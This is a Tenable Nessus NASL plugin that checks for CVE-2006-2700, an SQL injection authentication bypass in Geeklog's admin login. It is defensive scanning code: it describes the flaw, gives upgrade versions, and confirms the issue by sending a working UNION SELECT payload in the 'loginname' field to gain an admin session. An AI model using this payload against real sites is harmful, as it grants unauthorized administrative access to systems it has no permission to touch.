#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21619);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-2700");
  script_bugtraq_id(18154);

  script_name(english:"Geeklog Admin Authentication SQL Injection Vulnerability");
  script_summary(english:"Tries to bypass administrative authentication in Geeklog");
 
  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
an authentication bypass issue. 

Description :

The remote host is running Geeklog, an open-source weblog powered by
PHP and MySQL. 

The version of Geeklog installed on the remote fails to sanitize input
to the 'loginname' and 'passwd' parameters before using it in the
script 'admin/auth.inc.php' to construct database queries.  Provided
PHP's 'magic_quotes_gpc' setting is enabled, an unauthenticated
attacker can exploit this flaw to bypass authentication and gain
administrative access. 

See also :

http://www.securityfocus.com/archive/1/435295/30/0/threaded
http://www.geeklog.net/article.php/geeklog-1.4.0sr3

Solution :

Upgrade to Geeklog 1.3.11sr6 / 1.4.0sr3 or later. 

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/geeklog", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Make sure the affected script exists.
  url = string(dir, "/admin/moderation.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ('name="loginname" value="" ' >< res) 
  {
    # Try to exploit the issue to bypass authentication.
    uid = 2;                           # Admin account.
    pass = string(unixtime());
    sploit = string(SCRIPT_NAME, "' UNION SELECT 3,'", hexstr(MD5(pass)), "','email',", uid, " /*");

    postdata = string(
      "loginname=", urlencode(str:sploit), "&",
      "passwd=", pass
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (res == NULL) exit(0);

    # There's a problem if we have been authenticated.
    if (
      'meta http-equiv="refresh"' >< res &&
      egrep(pattern:'^Set-Cookie: +gl_session=', string:res)
    )
    {
      security_warning(port);
      exit(0);
    }
  }
}
